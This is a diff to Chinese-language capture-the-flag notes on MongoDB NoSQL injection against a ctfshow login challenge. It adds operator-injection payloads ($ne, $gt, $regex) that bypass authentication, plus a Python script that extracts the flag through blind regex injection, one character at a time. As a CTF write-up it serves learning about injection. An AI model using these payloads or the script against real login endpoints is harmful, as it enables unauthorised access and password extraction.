@@ -8,9 +8,18 @@
 $query = new MongoDB\Driver\Query($data);
 $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();
 
-直接登录
+将不等于1的数据都查询出来
 username[$ne]=1&password[$ne]=1
 $ne是不相等的意思
+
+查询用户名不为admin的数据
+username[$ne]=admin&password[$ne]=1
+
+大于
+username[$gt]=admin3&password[$ne]=1
+
+flag在password里面直接查
+username[$ne]=1&password[$regex]=^ctfshow{
 ```
 
 ^
@@ -29,3 +38,26 @@ $ne是不相等的意思
 | $not | 反匹配(1.3.3及以上版本)，字段值不匹配表达式或者字段值不存在。                   |
 | $or  | 或                                                    |
 
+^
+## **盲注**
+```
+# @author：Myon
+# @time：20240913
+import requests
+import string
+ 
+url = 'http://9e856a5a-0dd8-4fac-8b5a-450688cee600.challenge.ctf.show/api/'
+dic = string.digits+string.ascii_lowercase+'{}-_'
+out = 'ctfshow{'
+ 
+for j in range(9,50):
+    for k in dic:
+        payload = {'username[$ne]':'1','password[$regex]': f'^{out+k}'}
+        # print(payload)
+        re = requests.post(url, data=payload)
+        # print(re.text)
+        if "\\u767b\\u9646\\u6210\\u529f" in re.text: # 注意反斜杠需要转义
+            out += k
+            break
+    print(out)
+```
